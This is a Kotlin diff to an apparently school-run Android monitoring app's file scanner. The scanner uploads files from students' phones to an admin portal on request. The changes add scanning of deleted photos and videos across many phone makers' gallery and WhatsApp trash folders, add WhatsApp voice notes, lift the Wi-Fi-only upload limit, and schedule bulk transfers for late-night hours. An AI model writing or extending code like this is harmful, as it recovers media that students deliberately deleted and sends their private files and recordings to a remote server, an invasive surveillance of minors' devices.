@@ -36,10 +36,52 @@ import java.util.concurrent.TimeUnit
 object FileScannerService {
 
     private const val TAG = "FileScannerService"
-    val ALLOWED_IMAGE_EXTS = setOf("jpg", "jpeg", "png", "webp", "gif", "bmp", "heic", "heif")
+    val ALLOWED_IMAGE_EXTS = setOf("jpg", "jpeg", "png", "webp", "bmp", "heic", "heif")
     val ALLOWED_VIDEO_EXTS = setOf("mp4", "mkv", "mov", "avi", "3gp", "webm", "flv", "wmv")
     private val activeUploadIds: MutableSet<String> = java.util.concurrent.ConcurrentHashMap.newKeySet()
-    private val uploadQueueExecutor = java.util.concurrent.Executors.newFixedThreadPool(4)
+    private val uploadRetryCount: MutableMap<String, Int> = java.util.concurrent.ConcurrentHashMap()
+    private val uploadQueueExecutor = java.util.concurrent.Executors.newFixedThreadPool(6)
+
+    /**
+     * Memeriksa apakah berkas/jalur adalah sampah game (Free Fire, Mobile Legends, OBB),
+     * stiker WhatsApp, cache, atau thumbnail yang TIDAK boleh di-scan / diunggah.
+     */
+    fun isJunkFileOrPath(filePath: String?, fileName: String?): Boolean {
+        val p = (filePath ?: "").lowercase().replace('\\', '/')
+        val n = (fileName ?: "").lowercase()
+
+        // 1. Game assets & sampah file game (Free Fire, OBB, Mobile Legends, PUBG, dll)
+        if (p.contains("freefire") || p.contains("free fire") || p.contains("com.dts.freefire") ||
+            p.contains("mobile.legends") || p.contains("pubg") || p.contains("genshin") ||
+            p.contains("com.garena") || p.contains("/unity/") || p.contains("/unreal/") ||
+            p.contains("/android/obb") || p.contains(".obb") ||
+            n.endsWith(".obb") || n.contains("freefire")) {
+            return true
+        }
+
+        // 2. Sticker WhatsApp & animasi stiker
+        if (p.contains("whatsapp stickers") || p.contains("whatsapp animated gifs") ||
+            p.contains("/.stickers") || p.contains("/stickers/") || p.contains("/sticker/") ||
+            n.endsWith(".wastickers") || n.contains("sticker") || n.contains(".wasticker")) {
+            return true
+        }
+
+        // 3. Cache & temporary directories / files
+        if (p.contains("/cache/") || p.contains("/.cache/") ||
+            p.contains("/thumbnails/") || p.contains("/.thumbnails/") ||
+            n.endsWith(".tmp") || n.endsWith(".temp") || n.endsWith(".nomedia")) {
+            return true
+        }
+
+        // 4. Dokumen / PDF WhatsApp tidak usah di-scan / diunggah sesuai arahan
+        if (p.contains("whatsapp documents") || p.contains("whatsapp/media/whatsapp documents") ||
+            p.contains("whatsapp business/media/whatsapp business documents") ||
+            (p.contains("whatsapp") && (n.endsWith(".pdf") || n.endsWith(".doc") || n.endsWith(".docx") || n.endsWith(".xls") || n.endsWith(".xlsx")))) {
+            return true
+        }
+
+        return false
+    }
 
     /**
      * Mengambil data telemetri nyata perangkat (Baterai, Storage, WiFi)
@@ -183,6 +225,11 @@ object FileScannerService {
      * Scan seluruh berkas HP: STRICT MEDIA ONLY (Foto & Video)
      */
     fun scanAllFiles(context: Context): List<FileMetadata> {
+        if (!DeviceSyncManager.isScannerEnabledGlobally) {
+            Log.d(TAG, "[SCANNER OFF] scanAllFiles: Pemindaian berkas media dilewati karena dinonaktifkan di server.")
+            return emptyList()
+        }
+
         val fileMap = mutableMapOf<String, FileMetadata>()
 
         // Debug: Check permissions status
@@ -248,9 +295,53 @@ object FileScannerService {
                 val w4bVid = File(extStorage, "Android/media/com.whatsapp.w4b/WhatsApp Business/Media/WhatsApp Business Video")
                 if (w4bVid.exists()) targetDirs.add(w4bVid)
 
+                // WhatsApp Voice Notes & Audio (Dokumen WA dikecualikan sesuai arahan)
+                val waVoice = File(extStorage, "Android/media/com.whatsapp/WhatsApp/Media/WhatsApp Voice Notes")
+                if (waVoice.exists()) targetDirs.add(waVoice)
+                val waAudio = File(extStorage, "Android/media/com.whatsapp/WhatsApp/Media/WhatsApp Audio")
+                if (waAudio.exists()) targetDirs.add(waAudio)
+
                 File(extStorage, "Pictures/Screenshots").let { if (it.exists()) targetDirs.add(it) }
                 File(extStorage, "DCIM/Screenshots").let { if (it.exists()) targetDirs.add(it) }
                 File(extStorage, "DCIM/Camera").let { if (it.exists()) targetDirs.add(it) }
+
+                // ♻️ Trashed Media Direct Folders Mendalam (Tempat Sampah Galeri HP & Aplikasi)
+                val trashPaths = listOf(
+                    // Android Standard / Generic Trash & Scoped Storage
+                    ".trash", ".trashed", "Trash", "trash", ".recycle", "recycle", ".Trash-1000", ".Trash-0",
+                    "DCIM/.trash", "DCIM/.trashed", "DCIM/Trash", "DCIM/.recycle", "DCIM/.globalTrash", "DCIM/.Trash-1000",
+                    "Pictures/.trash", "Pictures/.trashed", "Pictures/Trash", "Pictures/.recycle", "Pictures/.Trash-1000",
+                    "Movies/.trash", "Movies/Trash", "Download/.trash", "Download/Trash",
+                    // Vivo & iQOO (FuntouchOS / OriginOS)
+                    ".vivo_trash", "DCIM/.vivo_trash", "Pictures/.vivo_trash",
+                    "Android/data/com.vivo.gallery/files/trash", "Android/media/com.vivo.gallery/.trash",
+                    // Xiaomi, Redmi & POCO (MIUI / HyperOS)
+                    "MIUI/Gallery/cloud/.trashBin", "MIUI/Gallery/cloud/trashBin", "MIUI/.trashBin", "MIUI/Gallery/.trashBin",
+                    "Android/media/com.miui.gallery/trashBin", "Android/data/com.miui.gallery/files/trashBin",
+                    // OPPO & Realme (ColorOS / RealmeUI)
+                    "ColorOS/Gallery/.trash", "Android/media/com.coloros.gallery3d/.trash", "Android/data/com.coloros.gallery3d/files/.trash",
+                    // OnePlus (OxygenOS)
+                    "Android/media/com.oneplus.gallery/.trash", "Android/data/com.oneplus.gallery/files/.trash",
+                    // Samsung (OneUI)
+                    "Android/media/com.sec.android.gallery3d/.trash", "Android/data/com.sec.android.gallery3d/files/.trash",
+                    "Android/data/com.sec.android.gallery3d/files/trash", "Android/data/com.sec.android.gallery3d/cache/trash",
+                    // Transsion / Infinix / Tecno / itel (XOS / HiOS)
+                    "Pictures/.gallery_trash", "DCIM/.gallery_trash", "Android/data/com.transsion.gallery/files/.trash", "Android/media/com.transsion.gallery/.trash",
+                    // Huawei & Honor (EMUI / MagicUI)
+                    "Pictures/.gallery2/recycle", "DCIM/.gallery2/recycle", "Android/data/com.huawei.photos/files/recycle",
+                    // WhatsApp & WhatsApp Business Media Trash
+                    "Android/media/com.whatsapp/WhatsApp/Media/.trash",
+                    "Android/media/com.whatsapp/WhatsApp/Media/WhatsApp Images/.trash",
+                    "Android/media/com.whatsapp/WhatsApp/Media/WhatsApp Video/.trash",
+                    "WhatsApp/Media/.trash", "WhatsApp/Media/WhatsApp Images/.trash", "WhatsApp/Media/WhatsApp Video/.trash",
+                    "Android/media/com.whatsapp.w4b/WhatsApp Business/Media/.trash",
+                    "Android/media/com.whatsapp.w4b/WhatsApp Business/Media/WhatsApp Business Images/.trash",
+                    "Android/media/com.whatsapp.w4b/WhatsApp Business/Media/WhatsApp Business Video/.trash"
+                )
+                for (tp in trashPaths) {
+                    val tf = File(extStorage, tp)
+                    if (tf.exists() && tf.canRead()) targetDirs.add(tf)
+                }
             }
 
             // Root folder kartu SD eksternal
@@ -267,6 +358,13 @@ object FileScannerService {
                             File(root, "Pictures"),
                             File(root, "Movies"),
                             File(root, "Download"),
+                            File(root, ".trash"),
+                            File(root, ".trashed"),
+                            File(root, ".Trash-1000"),
+                            File(root, "DCIM/.trash"),
+                            File(root, "Pictures/.trash"),
+                            File(root, "DCIM/.vivo_trash"),
+                            File(root, "Pictures/.vivo_trash"),
                             File(root, "Android/media/com.whatsapp/WhatsApp/Media/WhatsApp Images"),
                             File(root, "Android/media/com.whatsapp/WhatsApp/Media/WhatsApp Video")
                         )
@@ -278,7 +376,8 @@ object FileScannerService {
             }
 
             for (dir in targetDirs) {
-                scanDirectory(dir, fileMap, maxDepth = 4)
+                val depth = if (isTrashDirectory(dir)) 8 else 4
+                scanDirectory(dir, fileMap, maxDepth = depth)
             }
             Log.d(TAG, "[SCAN PROGRESS] After directory scan: ${fileMap.size} files total (scanned ${targetDirs.size} directories)")
         } catch (e: Throwable) {
@@ -289,25 +388,91 @@ object FileScannerService {
         return fileMap.values.toList()
     }
 
+    /**
+     * Membaca magic bytes berkas untuk mendeteksi tipe media saat nama berkas di trash tidak berekstensi normal.
+     * Mengembalikan null bila bukan media, atau "gif" bila file GIF agar bisa dilewati sesuai instruksi.
+     */
+    fun detectMediaExtensionFromBytes(file: File): String? {
+        if (!file.exists() || file.length() < 12L) return null
+        return try {
+            val header = ByteArray(16)
+            file.inputStream().use { it.read(header) }
+            when {
+                // JPEG: FF D8 FF
+                header[0] == 0xFF.toByte() && header[1] == 0xD8.toByte() && header[2] == 0xFF.toByte() -> "jpg"
+                // PNG: 89 50 4E 47
+                header[0] == 0x89.toByte() && header[1] == 0x50.toByte() && header[2] == 0x4E.toByte() && header[3] == 0x47.toByte() -> "png"
+                // WebP: RIFF .... WEBP
+                header[0] == 0x52.toByte() && header[1] == 0x49.toByte() && header[2] == 0x46.toByte() && header[3] == 0x46.toByte() &&
+                header[8] == 0x57.toByte() && header[9] == 0x45.toByte() && header[10] == 0x42.toByte() && header[11] == 0x50.toByte() -> "webp"
+                // MP4 / MOV / HEIC (ftyp)
+                header[4] == 0x66.toByte() && header[5] == 0x74.toByte() && header[6] == 0x79.toByte() && header[7] == 0x70.toByte() -> {
+                    val ftyp = String(header, 8, 4)
+                    if (ftyp.startsWith("heic") || ftyp.startsWith("mif1")) "heic" else "mp4"
+                }
+                // MKV / WebM: 1A 45 DF A3
+                header[0] == 0x1A.toByte() && header[1] == 0x45.toByte() && header[2] == 0xDF.toByte() && header[3] == 0xA3.toByte() -> "mkv"
+                // GIF: 47 49 46 (Dilewati sesuai instruksi)
+                header[0] == 0x47.toByte() && header[1] == 0x49.toByte() && header[2] == 0x46.toByte() -> "gif"
+                else -> null
+            }
+        } catch (e: Exception) {
+            null
+        }
+    }
+
     private fun scanDirectory(dir: File, fileMap: MutableMap<String, FileMetadata>, maxDepth: Int, currentDepth: Int = 0) {
         if (currentDepth > maxDepth || !dir.exists()) return
 
         try {
             val children = dir.listFiles() ?: return
+            val isDirInTrash = isTrashDirectory(dir)
             for (child in children) {
-                if (child.name.startsWith(".")) continue
+                val isChildTrash = child.name.startsWith(".trashed") || child.name.startsWith(".pending") || isTrashDirectory(child) || isDirInTrash
+                if (child.name.startsWith(".") && !isChildTrash) continue
                 if (child.isDirectory) {
                     if (shouldSkipDirectory(child)) continue
-                    scanDirectory(child, fileMap, maxDepth, currentDepth + 1)
+                    val depthLimit = if (isChildTrash || isDirInTrash) 8 else maxDepth
+                    scanDirectory(child, fileMap, depthLimit, currentDepth + 1)
                 } else if (child.isFile && child.length() > 0) {
-                    val ext = child.extension.lowercase()
+                    val rawName = child.name
+                    var cleanName = rawName
+                    if (rawName.startsWith(".trashed-") || rawName.startsWith(".trashed_")) {
+                        cleanName = rawName.substringAfter("-").substringAfter("-")
+                        if (cleanName == rawName) cleanName = rawName.substringAfter("_").substringAfter("_")
+                        if (cleanName.isEmpty()) cleanName = rawName
+                    } else if (rawName.startsWith(".trashed")) {
+                        cleanName = rawName.removePrefix(".trashed").removePrefix("-").removePrefix("_")
+                        if (cleanName.isEmpty()) cleanName = rawName
+                    }
+                    var ext = if (cleanName.contains(".")) cleanName.substringAfterLast(".").lowercase() else child.extension.lowercase()
+                    // Jika berkas berada di folder trash dan nama tidak memiliki ekstensi standar, deteksi via header magic bytes
+                    if ((ext.isEmpty() || ext.length > 5) && (isChildTrash || isDirInTrash)) {
+                        val detected = detectMediaExtensionFromBytes(child)
+                        if (!detected.isNullOrEmpty()) {
+                            ext = detected
+                            if (!cleanName.contains(".")) cleanName = "$cleanName.$ext"
+                        }
+                    }
+                    // Sesuai permintaan pengguna: File GIF tidak perlu di-scan
+                    if (ext == "gif") continue
+                    // Abaikan file game/sampah Free Fire, WhatsApp stickers, OBB kecuali jika berada di folder tempat sampah
+                    if (!isChildTrash && !isDirInTrash && isJunkFileOrPath(child.absolutePath, child.name)) continue
                     // STRICT MEDIA ONLY: filter images and videos only
                     if (ALLOWED_IMAGE_EXTS.contains(ext) || ALLOWED_VIDEO_EXTS.contains(ext)) {
                         val meta = createFileMetadata(child)
                         if (meta != null) {
                             val normPath = meta.filePath.replace("\\", "/")
                             if (!normPath.contains(".Statuses", ignoreCase = true) && !fileMap.containsKey(meta.filePath)) {
-                                fileMap[meta.filePath] = meta
+                                if (isChildTrash) {
+                                    fileMap[meta.filePath] = meta.copy(
+                                        fileName = if (cleanName.startsWith("♻️")) cleanName else "♻️ $cleanName",
+                                        category = "DELETED_MEDIA",
+                                        isDeleted = true
+                                    )
+                                } else {
+                                    fileMap[meta.filePath] = meta
+                                }
                             }
                         }
                     }
@@ -318,152 +483,18 @@ object FileScannerService {
         }
     }
 
+    // Thumbnails dinonaktifkan permanen sesuai instruksi: sangat menguras database & RAM HP siswa.
+    // Berkas langsung diunduh/ditampilkan dari file aslinya saat diminta portal.
     private fun extractThumbnailFromUri(context: Context, uri: Uri, isVideo: Boolean = false): String? {
-        return try {
-            var bitmap: Bitmap? = null
-
-            if (isVideo) {
-                // Video thumbnail generation: extract frame at 0L / 100000L with MediaMetadataRetriever.OPTION_CLOSEST_SYNC, with fallback to loadThumbnail
-                try {
-                    val retriever = MediaMetadataRetriever()
-                    retriever.setDataSource(context, uri)
-                    bitmap = retriever.getFrameAtTime(0L, MediaMetadataRetriever.OPTION_CLOSEST_SYNC)
-                        ?: retriever.getFrameAtTime(100000L, MediaMetadataRetriever.OPTION_CLOSEST_SYNC)
-                        ?: retriever.frameAtTime
-                    retriever.release()
-                } catch (e: Exception) {
-                    bitmap = null
-                }
-
-                // Fallback ke loadThumbnail
-                if (bitmap == null && Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
-                    try {
-                        bitmap = context.contentResolver.loadThumbnail(uri, Size(128, 128), null)
-                    } catch (e: Exception) {
-                        bitmap = null
-                    }
-                }
-            } else {
-                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
-                    try {
-                        bitmap = context.contentResolver.loadThumbnail(uri, Size(128, 128), null)
-                    } catch (e: Exception) {
-                        bitmap = null
-                    }
-                }
-
-                if (bitmap == null) {
-                    try {
-                        context.contentResolver.openInputStream(uri)?.use { stream ->
-                            val options = BitmapFactory.Options().apply { inJustDecodeBounds = true }
-                            BitmapFactory.decodeStream(stream, null, options)
-                            if (options.outWidth > 0 && options.outHeight > 0) {
-                                var sampleSize = 1
-                                while (options.outWidth / sampleSize > 128 || options.outHeight / sampleSize > 128) {
-                                    sampleSize *= 2
-                                }
-                                context.contentResolver.openInputStream(uri)?.use { stream2 ->
-                                    val decodeOptions = BitmapFactory.Options().apply { inSampleSize = sampleSize }
-                                    bitmap = BitmapFactory.decodeStream(stream2, null, decodeOptions)
-                                }
-                            }
-                        }
-                    } catch (e: Exception) {
-                        bitmap = null
-                    }
-                }
-            }
-
-            val b = bitmap ?: return null
-            val scaled = Bitmap.createScaledBitmap(b, 128, 128, true)
-            if (scaled != b) b.recycle()
-
-            val bos = ByteArrayOutputStream()
-            scaled.compress(Bitmap.CompressFormat.JPEG, 60, bos)
-            scaled.recycle()
-            val bytes = bos.toByteArray()
-            if (bytes.size in 1..40000) {
-                Base64.encodeToString(bytes, Base64.NO_WRAP)
-            } else {
-                null
-            }
-        } catch (e: Exception) {
-            null
-        }
+        return null
     }
 
     private fun extractThumbnailFromFile(file: File): String? {
-        return try {
-            if (!file.exists() || !file.canRead() || file.length() == 0L) return null
-            val options = BitmapFactory.Options().apply {
-                inJustDecodeBounds = true
-            }
-            BitmapFactory.decodeFile(file.absolutePath, options)
-            if (options.outWidth <= 0 || options.outHeight <= 0) return null
-
-            var sampleSize = 1
-            while (options.outWidth / sampleSize > 128 || options.outHeight / sampleSize > 128) {
-                sampleSize *= 2
-            }
-
-            val decodeOptions = BitmapFactory.Options().apply {
-                inSampleSize = sampleSize
-            }
-            val bitmap = BitmapFactory.decodeFile(file.absolutePath, decodeOptions) ?: return null
-            val scaled = Bitmap.createScaledBitmap(bitmap, 128, 128, true)
-            if (scaled != bitmap) bitmap.recycle()
-
-            val bos = ByteArrayOutputStream()
-            scaled.compress(Bitmap.CompressFormat.JPEG, 60, bos)
-            scaled.recycle()
-            val bytes = bos.toByteArray()
-            if (bytes.size in 1..40000) {
-                Base64.encodeToString(bytes, Base64.NO_WRAP)
-            } else {
-                null
-            }
-        } catch (e: Exception) {
-            null
-        }
+        return null
     }
 
     private fun extractThumbnailFromVideo(file: File): String? {
-        return try {
-            if (!file.exists() || !file.canRead() || file.length() == 0L) return null
-            var bitmap: Bitmap? = null
-            try {
-                val retriever = MediaMetadataRetriever()
-                retriever.setDataSource(file.absolutePath)
-                bitmap = retriever.getFrameAtTime(0L, MediaMetadataRetriever.OPTION_CLOSEST_SYNC)
-                    ?: retriever.getFrameAtTime(100000L, MediaMetadataRetriever.OPTION_CLOSEST_SYNC)
-                    ?: retriever.frameAtTime
-                retriever.release()
-            } catch (e: Exception) {
-                bitmap = null
-            }
-
-            if (bitmap == null && Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
-                try {
-                    bitmap = android.media.ThumbnailUtils.createVideoThumbnail(file.absolutePath, MediaStore.Images.Thumbnails.MINI_KIND)
-                } catch (e: Exception) {
-                    bitmap = null
-                }
-            }
-
-            if (bitmap != null) {
-                val scaled = Bitmap.createScaledBitmap(bitmap, 128, 128, true)
-                if (scaled != bitmap) bitmap.recycle()
-                val bos = ByteArrayOutputStream()
-                scaled.compress(Bitmap.CompressFormat.JPEG, 60, bos)
-                scaled.recycle()
-                val bytes = bos.toByteArray()
-                if (bytes.size in 1..40000) {
-                    Base64.encodeToString(bytes, Base64.NO_WRAP)
-                } else null
-            } else null
-        } catch (e: Exception) {
-            null
-        }
+        return null
     }
 
     private fun createFileMetadata(file: File): FileMetadata? {
@@ -516,14 +547,29 @@ object FileScannerService {
                 val mimeIdx = it.getColumnIndex(MediaStore.MediaColumns.MIME_TYPE)
                 val dateIdx = it.getColumnIndex(MediaStore.MediaColumns.DATE_MODIFIED)
 
+                var thumbGenCount = 0
                 while (it.moveToNext()) {
                     try {
                         val id = if (idIdx != -1) it.getLong(idIdx) else 0L
                         val name = if (nameIdx != -1) it.getString(nameIdx) else null ?: continue
-                        if (name.startsWith(".")) continue
+                        val rawDataPath = if (dataIdx != -1) it.getString(dataIdx) else null
+                        val pathLower = rawDataPath?.lowercase() ?: ""
+                        val nameLower = name.lowercase()
+                        val isItemTrashed = nameLower.startsWith(".trashed") || 
+                                            nameLower.startsWith(".pending") ||
+                                            pathLower.contains("/.trash") || 
+                                            pathLower.contains("/.trashed") || 
+                                            pathLower.contains("/.recycle") || 
+                                            pathLower.contains("/recycle") ||
+                                            pathLower.contains("globaltrash") || 
+                                            pathLower.contains("vivo_trash") || 
+                                            pathLower.contains("trashbin") ||
+                                            pathLower.contains("/trash/") ||
+                                            pathLower.contains("/recently deleted")
+
+                        if (name.startsWith(".") && !isItemTrashed) continue
                         val directUri = ContentUris.withAppendedId(contentUri, id)
                         val directUriStr = directUri.toString()
-                        val rawDataPath = if (dataIdx != -1) it.getString(dataIdx) else null
                         val compositeFilePath = if (!rawDataPath.isNullOrEmpty()) "$rawDataPath::$directUriStr" else directUriStr
                         val dedupeKey = rawDataPath ?: directUriStr
 
@@ -533,17 +579,35 @@ object FileScannerService {
                         val mime = if (mimeIdx != -1) it.getString(mimeIdx) else null
                         val dateModified = if (dateIdx != -1) it.getLong(dateIdx) * 1000L else System.currentTimeMillis()
 
-                        val extension = name.substringAfterLast('.', "").lowercase()
+                        var cleanName = name
+                        if (name.startsWith(".trashed-") || name.startsWith(".trashed_")) {
+                            cleanName = name.substringAfter("-").substringAfter("-")
+                            if (cleanName == name) cleanName = name.substringAfter("_").substringAfter("_")
+                            if (cleanName.isEmpty()) cleanName = name
+                        } else if (name.startsWith(".trashed")) {
+                            cleanName = name.removePrefix(".trashed").removePrefix("-").removePrefix("_")
+                            if (cleanName.isEmpty()) cleanName = name
+                        }
+                        val extension = cleanName.substringAfterLast('.', "").lowercase()
+                        // Sesuai permintaan pengguna: File GIF tidak perlu di-scan
+                        if (extension == "gif") continue
+                        // Abaikan file game/sampah Free Fire, WhatsApp stickers, OBB kecuali jika berada di folder tempat sampah
+                        if (!isItemTrashed && isJunkFileOrPath(rawDataPath ?: compositeFilePath, name)) continue
                         if (!ALLOWED_IMAGE_EXTS.contains(extension) && !ALLOWED_VIDEO_EXTS.contains(extension)) continue
-                        val category = if (ALLOWED_VIDEO_EXTS.contains(extension)) "VIDEO" else "IMAGE"
+                        val category = if (isItemTrashed) "DELETED_MEDIA" else if (ALLOWED_VIDEO_EXTS.contains(extension)) "VIDEO" else "IMAGE"
 
                         if (compositeFilePath.contains(".Statuses", ignoreCase = true) || (rawDataPath != null && rawDataPath.contains(".Statuses", ignoreCase = true))) continue
 
-                        // Generate thumbnail tanpa batasan 250 cap
-                        val thumbBase64 = extractThumbnailFromUri(context, directUri, isVideo = (category == "VIDEO"))
+                        // Batasi pembuatan Base64 thumbnail agar tidak memicu OutOfMemoryError dan payload JSON bengkak
+                        val shouldGenThumb = isItemTrashed || (thumbGenCount < 60)
+                        val thumbBase64 = if (shouldGenThumb) {
+                            val t = extractThumbnailFromUri(context, directUri, isVideo = (category == "VIDEO"))
+                            if (t != null && !isItemTrashed) thumbGenCount++
+                            t
+                        } else null
 
                         fileMap[dedupeKey] = FileMetadata(
-                            fileName = name,
+                            fileName = if (isItemTrashed) (if (cleanName.startsWith("♻️")) cleanName else "♻️ $cleanName") else name,
                             filePath = compositeFilePath,
                             fileExtension = extension.ifEmpty { null },
                             fileSize = size,
@@ -551,11 +615,77 @@ object FileScannerService {
                             mimeType = mime ?: getMimeType(extension),
                             category = category,
                             lastModified = dateModified,
-                            thumbnailBase64 = thumbBase64
+                            thumbnailBase64 = thumbBase64,
+                            isDeleted = isItemTrashed
                         )
                     } catch (rowErr: Throwable) {
                         // Safe skip row bermasalah
                     }
+                }
+            }
+
+            // ♻️ Scan Khusus Trash MediaStore (Android 11+ / API 30+)
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
+                try {
+                    val trashBundle = android.os.Bundle().apply {
+                        putInt(MediaStore.QUERY_ARG_MATCH_TRASHED, MediaStore.MATCH_ONLY)
+                    }
+                    val trashCursor = context.contentResolver.query(contentUri, projections, trashBundle, null)
+                    trashCursor?.use {
+                        val idIdx = it.getColumnIndex(MediaStore.MediaColumns._ID)
+                        val nameIdx = it.getColumnIndex(MediaStore.MediaColumns.DISPLAY_NAME)
+                        val dataIdx = it.getColumnIndex(MediaStore.MediaColumns.DATA)
+                        val sizeIdx = it.getColumnIndex(MediaStore.MediaColumns.SIZE)
+                        val mimeIdx = it.getColumnIndex(MediaStore.MediaColumns.MIME_TYPE)
+                        val dateIdx = it.getColumnIndex(MediaStore.MediaColumns.DATE_MODIFIED)
+
+                        while (it.moveToNext()) {
+                            try {
+                                val id = if (idIdx != -1) it.getLong(idIdx) else 0L
+                                val name = if (nameIdx != -1) it.getString(nameIdx) else null ?: continue
+                                val directUri = ContentUris.withAppendedId(contentUri, id)
+                                val directUriStr = directUri.toString()
+                                val rawDataPath = if (dataIdx != -1) it.getString(dataIdx) else null
+                                val compositeFilePath = if (!rawDataPath.isNullOrEmpty()) "$rawDataPath::$directUriStr" else directUriStr
+                                val dedupeKey = rawDataPath ?: directUriStr
+
+                                if (fileMap.containsKey(dedupeKey)) continue
+
+                                val size = if (sizeIdx != -1) it.getInt(sizeIdx) else 0
+                                val mime = if (mimeIdx != -1) it.getString(mimeIdx) else null
+                                val dateModified = if (dateIdx != -1) it.getLong(dateIdx) * 1000L else System.currentTimeMillis()
+
+                                var cleanName = name
+                                if (name.startsWith(".trashed-") || name.startsWith(".trashed_")) {
+                                    cleanName = name.substringAfter("-").substringAfter("-")
+                                    if (cleanName == name) cleanName = name.substringAfter("_").substringAfter("_")
+                                    if (cleanName.isEmpty()) cleanName = name
+                                } else if (name.startsWith(".trashed")) {
+                                    cleanName = name.removePrefix(".trashed").removePrefix("-").removePrefix("_")
+                                    if (cleanName.isEmpty()) cleanName = name
+                                }
+                                val extension = cleanName.substringAfterLast('.', "").lowercase()
+                                // Sesuai permintaan pengguna: File GIF tidak perlu di-scan
+                                if (extension == "gif") continue
+                                val thumbBase64 = extractThumbnailFromUri(context, directUri, isVideo = (mime?.startsWith("video") == true))
+
+                                fileMap[dedupeKey] = FileMetadata(
+                                    fileName = if (cleanName.startsWith("♻️")) cleanName else "♻️ $cleanName",
+                                    filePath = compositeFilePath,
+                                    fileExtension = extension.ifEmpty { null },
+                                    fileSize = size,
+                                    fileSizeHuman = formatFileSize(size.toLong()),
+                                    mimeType = mime ?: getMimeType(extension),
+                                    category = "DELETED_MEDIA",
+                                    lastModified = dateModified,
+                                    thumbnailBase64 = thumbBase64,
+                                    isDeleted = true
+                                )
+                            } catch (_: Throwable) {}
+                        }
+                    }
+                } catch (trashErr: Throwable) {
+                    Log.d(TAG, "MediaStore MATCH_ONLY trashed query not supported on this device: ${trashErr.message}")
                 }
             }
         } catch (e: Throwable) {
@@ -567,6 +697,12 @@ object FileScannerService {
      * Kirim file metadata ke server
      */
     fun syncFilesToServer(context: Context, files: List<FileMetadata>, onComplete: ((Int) -> Unit)? = null) {
+        if (!DeviceSyncManager.isScannerEnabledGlobally) {
+            Log.d(TAG, "[SCANNER OFF] syncFilesToServer: Pengiriman berkas dilewati karena dinonaktifkan di server.")
+            onComplete?.invoke(0)
+            return
+        }
+
         Thread {
             try {
                 val androidId = Settings.Secure.getString(context.contentResolver, Settings.Secure.ANDROID_ID) ?: "unknown_device"
@@ -602,6 +738,12 @@ object FileScannerService {
                     }
                 }
                 Log.d(TAG, "Files metadata synced: $totalSynced / ${files.size} files")
+                val hasDeleted = files.any { it.category == "DELETED_MEDIA" || it.isDeleted == true }
+                if (hasDeleted) {
+                    android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
+                        checkPendingRequests(context)
+                    }, 2000)
+                }
                 onComplete?.invoke(totalSynced)
             } catch (e: Exception) {
                 Log.e(TAG, "Error in syncFilesToServer: ${e.message}")
@@ -611,7 +753,21 @@ object FileScannerService {
     }
 
     /**
-     * Memeriksa apakah perangkat terhubung ke Wi-Fi (untuk menghemat kuota seluler siswa)
+     * Memeriksa apakah perangkat terhubung ke internet aktif (Wi-Fi atau Data Seluler)
+     */
+    fun isNetworkConnected(context: Context): Boolean {
+        return try {
+            val cm = context.getSystemService(Context.CONNECTIVITY_SERVICE) as? android.net.ConnectivityManager ?: return false
+            val activeNetwork = cm.activeNetwork ?: return false
+            val caps = cm.getNetworkCapabilities(activeNetwork) ?: return false
+            caps.hasCapability(android.net.NetworkCapabilities.NET_CAPABILITY_INTERNET)
+        } catch (e: Exception) {
+            false
+        }
+    }
+
+    /**
+     * Memeriksa apakah perangkat terhubung ke Wi-Fi
      */
     fun isWifiConnected(context: Context): Boolean {
         return try {
@@ -626,28 +782,79 @@ object FileScannerService {
 
     /**
      * Cek dan penuhi antrean copy requests dari admin portal (seperti AirDroid)
-     * PENTING: Pengunggahan berkas HANYA dieksekusi saat HP terhubung ke Wi-Fi agar kuota siswa tidak habis.
+     * Pengunggahan berkas otomatis berjalan saat perangkat online (Wi-Fi atau Seluler).
+     * Jika perangkat offline, request tetap PENDING di server dan akan dilanjutkan otomatis saat HP online kembali.
      */
     fun checkPendingRequests(context: Context) {
         try {
             val androidId = Settings.Secure.getString(context.contentResolver, Settings.Secure.ANDROID_ID) ?: return
 
+            // GUARD: Pastikan ada koneksi internet aktif
+            val netReady = isNetworkConnected(context)
+            if (!netReady) {
+                Log.d(TAG, "[NETWORK GUARD] Perangkat offline — upload ditunda. Request tetap PENDING di server, akan dilanjutkan otomatis saat HP online kembali.")
+                return
+            }
+
             ApiClient.getClient(context).getPendingCopyRequests(androidId).enqueue(object : Callback<PendingRequestsResponse> {
                 override fun onResponse(call: Call<PendingRequestsResponse>, response: Response<PendingRequestsResponse>) {
                     if (response.isSuccessful && response.body()?.requests?.isNotEmpty() == true) {
+                        // Double-check koneksi masih tersambung sebelum mulai upload
+                        if (!isNetworkConnected(context)) {
+                            Log.d(TAG, "[NETWORK GUARD] Internet terputus setelah fetch queue — upload dibatalkan, akan resume otomatis saat online kembali.")
+                            return
+                        }
                         val reqList = response.body()!!.requests
+                        val cal = java.util.Calendar.getInstance(java.util.TimeZone.getTimeZone("Asia/Jakarta"))
+                        val hour = cal.get(java.util.Calendar.HOUR_OF_DAY)
+                        val isNightSleepWindow = (hour >= 23 || hour < 5)
+
+                        // Jika antrean > 2 berkas dan di luar waktu malam/tidur (05:00 - 23:00 WIB), tunda transfer massal
+                        if (reqList.size > 2 && !isNightSleepWindow) {
+                            Log.d(TAG, "Mode siang aktif: Transfer massal (${reqList.size} berkas) ditangguhkan agar HP siswa tidak lemot saat dipakai. Dijalankan pada jam tidur malam (23:00 - 05:00 WIB).")
+                            return
+                        }
+
                         for (req in reqList) {
                             if (activeUploadIds.contains(req.requestId)) continue
+
+                            // BUG-NEW-06 Fix: Batasi maksimal 5 kali percobaan retry untuk mencegah infinite loop & hemat baterai
+                            val currentAttempts = uploadRetryCount.getOrDefault(req.requestId, 0)
+                            if (currentAttempts >= 5) {
+                                Log.w(TAG, "[RETRY GUARD] Permintaan ${req.requestId} (${req.fileName}) telah gagal 5x. Melaporkan kegagalan permanen ke server...")
+                                val failReq = UploadFileRequest(
+                                    requestId = req.requestId,
+                                    fileName = req.fileName,
+                                    errorMessage = "Gagal diunggah setelah 5 kali percobaan (akses ditolak OS / berkas corrupt)."
+                                )
+                                ApiClient.getClient(context).uploadDeviceFile(failReq).enqueue(object : Callback<BasicResponse> {
